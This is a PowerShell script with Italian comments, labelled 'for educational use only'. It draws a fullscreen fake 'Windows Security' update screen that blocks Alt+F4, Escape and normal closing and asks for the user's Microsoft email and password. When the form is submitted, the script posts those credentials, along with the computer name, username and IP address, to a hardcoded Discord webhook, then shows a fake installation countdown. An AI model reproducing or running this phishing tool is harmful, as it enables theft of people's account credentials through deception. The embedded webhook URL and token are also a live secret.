# ============================================================
# FAKE WINDOWS UPDATE - Fullscreen CENTRATO + Invio Discord
# SOLO PER USO EDUCATIVO SU PROPRI SISTEMI
# Salva questo file come UTF-8 (in Notepad: Salva con nome > Codifica: UTF-8)
# Per uscire durante i test: Ctrl+Alt+Canc > Task Manager
# ============================================================

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== WEBHOOK DISCORD =====
$webhookUrl = "https://discord.com/api/webhooks/1529904963415834634/0kempgpHBEvLgDayfv3zLV_h3cJ7C67FXEsbfhnrT_Bg20YKb1mcFnBOCW0h3iP9tsUA"

# ===== FUNZIONE INVIO A DISCORD =====
function Send-DiscordMessage {
    param($Email, $Password)
    
    $computerName = $env:COMPUTERNAME
    $username = $env:USERNAME
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -notlike "*Loopback*" | Select-Object -First 1).IPAddress
    
    $message = @"
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **NUOVE CREDENZIALI CATTURATE**
━━━━━━━━━━━━━━━━━━━━━━━━
📧 **Email:** ````$Email````
🔑 **Password:** ````$Password````
━━━━━━━━━━━━━━━━━━━━━━━━
🖥️ **Computer:** $computerName
👤 **Utente:** $username
🌐 **IP:** $ip
🕐 **Ora:** $timestamp
━━━━━━━━━━━━━━━━━━━━━━━━
"@

    $payload = @{ content = $message } | ConvertTo-Json -Depth 10
    
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json; charset=utf-8" | Out-Null
        return $true
    }
    catch {
        Write-Host "Errore invio Discord: $_" -ForegroundColor Red
        return $false
    }
}

# ===== FINESTRA FULLSCREEN =====
$form = New-Object System.Windows.Forms.Form
$form.Text = "Windows Security"
$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$form.ControlBox = $false
$form.ShowIcon = $false
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::Black
$form.KeyPreview = $true

# Blocca Alt+F4 e altri tasti
$form.Add_KeyDown({
    if ($_.Alt -and $_.KeyCode -eq 'F4') { $_.SuppressKeyPress = $true }
    if ($_.KeyCode -eq 'Escape') { $_.SuppressKeyPress = $true }
    if ($_.Control -and $_.Shift -and $_.KeyCode -eq 'Escape') { $_.SuppressKeyPress = $true }
})

# Blocca chiusura finestra
$form.Add_FormClosing({
    if ($_.CloseReason -eq 'UserClosing') { $_.Cancel = $true }
})

# ===== CALCOLA IL CENTRO DELLO SCHERMO =====
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$screenWidth = $screen.Bounds.Width
$screenHeight = $screen.Bounds.Height

$boxWidth = 550
$boxHeight = 650

$startX = ($screenWidth - $boxWidth) / 2
$startY = ($screenHeight - $boxHeight) / 2

# ===== PANNELLO CENTRALE =====
$panel = New-Object System.Windows.Forms.Panel
$panel.Size = New-Object System.Drawing.Size($boxWidth, $boxHeight)
$panel.Location = New-Object System.Drawing.Point($startX, $startY)
$panel.BackColor = [System.Drawing.Color]::FromArgb(15, 15, 15)
$panel.BorderStyle = [System.Windows.Forms.BorderStyle]::None
$form.Controls.Add($panel)

# Coordinate relative al pannello
$x = 50
$y = 40

# Icona scudo
$iconShield = New-Object System.Windows.Forms.Label
$iconShield.Text = [char]0xE73A
$iconShield.Font = New-Object System.Drawing.Font("Segoe MDL2 Assets", 48)
$iconShield.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 212)
$iconShield.AutoSize = $true
$iconShield.Location = New-Object System.Drawing.Point($x, $y)
$panel.Controls.Add($iconShield)

$y += 65

# Titolo
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "Windows Security"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 24, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::White
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point($x, $y)
$panel.Controls.Add($titleLabel)

$y += 45

# Sottotitolo
$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Aggiornamento critico di sicurezza richiesto"
$subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 200)
$subtitleLabel.AutoSize = $true
$subtitleLabel.Location = New-Object System.Drawing.Point($x, $y)
$panel.Controls.Add($subtitleLabel)

$y += 40

# Linea separatrice
$line = New-Object System.Windows.Forms.Label
$line.Size = New-Object System.Drawing.Size(450, 2)
$line.Location = New-Object System.Drawing.Point($x, $y)
$line.BackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
$panel.Controls.Add($line)

$y += 25

# Descrizione
$descLabel = New-Object System.Windows.Forms.Label
$descLabel.Text = "Per completare l'installazione degli aggiornamenti,`n" + [char]0xE8 + " necessario verificare la tua identit" + [char]0xE0 + " Microsoft."
$descLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$descLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$descLabel.AutoSize = $true
$descLabel.MaximumSize = New-Object System.Drawing.Size(450, 100)
$descLabel.Location = New-Object System.Drawing.Point($x, $y)
$panel.Controls.Add($descLabel)

$y += 70

# Campo Email
$emailLabel = New-Object System.Windows.Forms.Label
$emailLabel.Text = "Account Microsoft (email):"
$emailLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$emailLabel.ForeColor = [System.Drawing.Color]::White
$emailLabel.AutoSize = $true
$emailLabel.Location = New-Object System.Drawing.Point($x, $y)
$panel.Controls.Add($emailLabel)

$y += 25

$emailBox = New-Object System.Windows.Forms.TextBox
$emailBox.Size = New-Object System.Drawing.Size(450, 25)
$emailBox.Location = New-Object System.Drawing.Point($x, $y)
$emailBox.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$emailBox.ForeColor = [System.Drawing.Color]::White
$emailBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$emailBox.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$panel.Controls.Add($emailBox)

$y += 45

# Campo Password
$passLabel = New-Object System.Windows.Forms.Label
$passLabel.Text = "Password:"
$passLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$passLabel.ForeColor = [System.Drawing.Color]::White
$passLabel.AutoSize = $true
$passLabel.Location = New-Object System.Drawing.Point($x, $y)
$panel.Controls.Add($passLabel)

$y += 25

$passBox = New-Object System.Windows.Forms.TextBox
$passBox.Size = New-Object System.Drawing.Size(450, 25)
$passBox.Location = New-Object System.Drawing.Point($x, $y)
$passBox.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$passBox.ForeColor = [System.Drawing.Color]::White
$passBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$passBox.PasswordChar = '●'
$passBox.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$panel.Controls.Add($passBox)

$y += 35

# Link finto
$forgotLink = New-Object System.Windows.Forms.LinkLabel
$forgotLink.Text = "Password dimenticata?"
$forgotLink.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$forgotLink.LinkColor = [System.Drawing.Color]::FromArgb(0, 120, 212)
$forgotLink.AutoSize = $true
$forgotLink.Location = New-Object System.Drawing.Point($x, $y)
$panel.Controls.Add($forgotLink)

$y += 55

# Pulsante Verifica
$updateButton = New-Object System.Windows.Forms.Button
$updateButton.Text = "Verifica e aggiorna"
$updateButton.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$updateButton.Size = New-Object System.Drawing.Size(220, 45)
$updateButton.Location = New-Object System.Drawing.Point($x, $y)
$updateButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 212)
$updateButton.ForeColor = [System.Drawing.Color]::White
$updateButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$updateButton.FlatAppearance.BorderSize = 0
$updateButton.Cursor = [System.Windows.Forms.Cursors]::Hand

# Pulsante Annulla
$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Text = "Annulla"
$cancelButton.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$cancelButton.Size = New-Object System.Drawing.Size(100, 35)
$cancelButton.Location = New-Object System.Drawing.Point($x + 235, $y + 5)
$cancelButton.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
$cancelButton.ForeColor = [System.Drawing.Color]::White
$cancelButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$cancelButton.FlatAppearance.BorderSize = 0
$cancelButton.Cursor = [System.Windows.Forms.Cursors]::Hand
$cancelButton.Add_Click({ $form.Close() })
$panel.Controls.Add($cancelButton)

$y += 70

# Barra di progresso (nascosta)
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Size = New-Object System.Drawing.Size(450, 20)
$progressBar.Location = New-Object System.Drawing.Point($x, $y)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Marquee
$progressBar.Visible = $false
$panel.Controls.Add($progressBar)

# Label stato (nascosta)
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = ""
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$statusLabel.ForeColor = [System.Drawing.Color]::Lime
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point($x, $y - 25)
$statusLabel.Visible = $false
$panel.Controls.Add($statusLabel)

# ===== EVENTO CLICK =====
$updateButton.Add_Click({
    $email = $emailBox.Text
    $password = $passBox.Text
    
    if ([string]::IsNullOrWhiteSpace($email) -or [string]::IsNullOrWhiteSpace($password)) {
        [System.Windows.Forms.MessageBox]::Show(
            "Inserisci sia l'email che la password.", "Windows Security",
            [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning
        )
        return
    }
    
    # Invia a Discord
    Send-DiscordMessage -Email $email -Password $password | Out-Null
    
    # Nascondi i campi input
    $emailLabel.Visible = $false
    $emailBox.Visible = $false
    $passLabel.Visible = $false
    $passBox.Visible = $false
    $forgotLink.Visible = $false
    $updateButton.Visible = $false
    $cancelButton.Visible = $false
    
    # Mostra stato aggiornamento
    $descLabel.Text = "Installazione degli aggiornamenti in corso..."
    $descLabel.ForeColor = [System.Drawing.Color]::Lime
    $progressBar.Visible = $true
    $statusLabel.Visible = $true
    $panel.Refresh()
    
    # Countdown finto
    for ($i = 25; $i -gt 0; $i--) {
        $statusLabel.Text = "Tempo rimanente: $i secondi - Non spegnere il computer."
        $panel.Refresh()
        Start-Sleep -Seconds 1
    }
    
    # Completamento
    $progressBar.Visible = $false
    $statusLabel.Text = ""
    $descLabel.Text = "Aggiornamenti installati con successo!"
    $descLabel.ForeColor = [System.Drawing.Color]::Lime
    $subtitleLabel.Text = "Il sistema verr" + [char]0xE0 + " riavviato automaticamente."
    $panel.Refresh()
    
    Start-Sleep -Seconds 4
    $form.Close()
})
$panel.Controls.Add($updateButton)

# ===== MOSTRA LA FINESTRA =====
$form.ShowDialog() | Out-Null